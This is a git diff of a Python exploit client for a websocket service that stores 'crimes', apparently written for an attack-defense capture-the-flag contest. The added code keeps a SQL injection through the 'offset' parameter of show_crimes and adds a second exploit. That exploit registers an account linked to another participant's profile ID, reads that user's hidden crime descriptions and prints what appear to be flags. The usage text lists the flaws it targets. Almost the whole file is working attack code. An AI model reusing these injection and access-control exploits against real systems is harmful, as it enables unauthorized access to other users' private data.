@@ -9,32 +9,41 @@ from websocket import create_connection
 
 __author__ = 'm_messiah'
 
+
 def close(s):
     print(s, file=stderr)
     exit(1)
 
+
 class Client(object):
-    def __init__(self, sock, username, password):
+    def __init__(self, sock):
+        self.username = self.password = None
+        self.ws = sock
+        self.sploit = [self.sploit_sql, self.sploit_profile]
+
+    def register(self, username, password, profile=None):
+        """Registration"""
         self.username = username
         self.password = password
-        self.ws = sock
-        self.sploit = [self.sploit_sql, ]
-
-    def register(self):
-        """Registration"""
         self.ws.send(dumps(
             {'action': 'register',
-             'params': {'user': self.username, 'password': self.password}}))
+             'params': {'username': self.username,
+                        'password': self.password,
+                        'profile': profile}}))
         answer = loads(self.ws.recv())
         if "successful" not in answer["text"]:
             close("registration failed: %s" % answer)
         return answer
 
-    def auth(self):
+    def auth(self, username=None, password=None):
         """Authentication"""
+        if username:
+            self.username = username
+            self.password = password
         self.ws.send(dumps(
             {'action': 'auth',
-             'params': {'user': self.username, 'password': self.password}}))
+             'params': {'username': self.username,
+                        'password': self.password}}))
         answer = loads(self.ws.recv())
         if "Welcome" not in answer["text"]:
             close("authentication failed: %s" % answer)
@@ -53,6 +62,8 @@ class Client(object):
         return answer
 
     def sploit_sql(self):
+        # self.register('%x' % randrange(16**15), '%x' % randrange(16**15))
+        self.auth("user1", 'qwerty')
         self.ws.send(dumps(
             {'action': 'show_crimes',
              'params': {'offset': "0; select crimeid, name, description, "
@@ -68,6 +79,49 @@ class Client(object):
         else:
             print(answer, file=stderr)
 
+    def sploit_profile(self):
+        for offset in range(5):
+            self.ws.send(dumps({'action': 'show_crimes',
+                                'params': {'offset': offset}}))
+            answer = loads(self.ws.recv())
+            if "rows" not in answer or "data" not in answer["rows"][0]:
+                return
+
+            crimes = list(filter(lambda cr: cr['public'] == "fa-lock",
+                                 answer["rows"][0]["data"]))
+            for crime in crimes:
+                self.ws.send(dumps({
+                    'action': 'show_crime',
+                    'params': {'crimeid': crime["crimeid"]}}))
+                answer = loads(self.ws.recv())
+                last_participant = answer['text'].split(" or ")[-1].strip()
+                if not last_participant:
+                    continue
+                self.ws.send(dumps({
+                    'action': 'search',
+                    'params': {
+                        'text': last_participant.replace(".&nbsp;", " ")
+                    }
+                }))
+                answer = loads(self.ws.recv())
+                if ('rows' not in answer or "data" not in answer['rows'][0] or
+                        'profileid' not in answer['rows'][0]['data'][0]):
+                    continue
+                self.register('%x' % randrange(16**15),
+                              '%x' % randrange(16**15),
+                              answer['rows'][0]['data'][0]['profileid'])
+                self.auth()
+                self.ws.send(dumps({'action': 'show_my_profile'}))
+                answer = loads(self.ws.recv())
+                if ('rows' in answer and 'cols' in answer['rows'][0] and
+                        'rows' in answer['rows'][0]['cols'][1] and
+                        len(answer['rows'][0]['cols'][1]['rows'])):
+                    crs = answer['rows'][0]['cols'][1]['rows'][1]
+                    if 'hidden' in crs and not crs['hidden'] and 'data' in crs:
+                        cr = answer['rows'][0]['cols'][1]['rows'][1]['data']
+                        for my_cr in cr:
+                            print(my_cr['description'].split()[-1])
+
 
 if __name__ == '__main__':
     answer = ""
@@ -75,6 +129,12 @@ if __name__ == '__main__':
         close("Usage: %s <sploit_num> <address>\n"
               "where <sploit_num>:\n"
               "0 - sql injection in show_crimes\n"
+              "1 - register with participant profile\n"
+              "* - len(username) = admin\n"
+              "* - get participant profile, "
+              "using known private info (from your db)\n"
+              "* - get crimes description from your profile "
+              "right after someone get opens participant profile\n"
               "" % argv[0])
     try:
         ws = create_connection("ws://%s:1984/websocket" % argv[2])
@@ -82,10 +142,7 @@ if __name__ == '__main__':
         answer = loads(ws.recv())
         if answer['rows'][0]['view'] != "form":
             raise KeyError
-        #c = Client(ws, '%x' % randrange(16**15), '%x' % randrange(16**15))
-        c = Client(ws, "user1", 'qwerty')
-        #c.register()
-        c.auth()
+        c = Client(ws)
         # Magic
         c.sploit[int(argv[1])]()
 
@@ -96,5 +153,5 @@ if __name__ == '__main__':
     finally:
         try:
             ws.close()
-        except:
+        except UnboundLocalError:
             pass
